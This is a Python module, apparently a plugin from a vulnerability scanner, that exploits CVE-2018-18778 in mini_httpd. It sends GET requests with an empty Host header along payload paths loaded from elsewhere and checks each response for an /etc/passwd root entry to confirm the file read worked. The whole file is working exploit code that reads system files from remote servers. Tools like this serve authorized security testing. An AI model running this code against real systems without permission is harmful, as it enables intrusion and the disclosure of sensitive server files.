#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def cve_2018_18778_scan(self, url):
    ''' 在mini_httpd开启虚拟主机模式的情况下, 用户请求http://HOST/FILE将会访问到当前目录下的HOST/FILE文件 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2018-18778'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {
        'Host': ''
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2018_18778_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
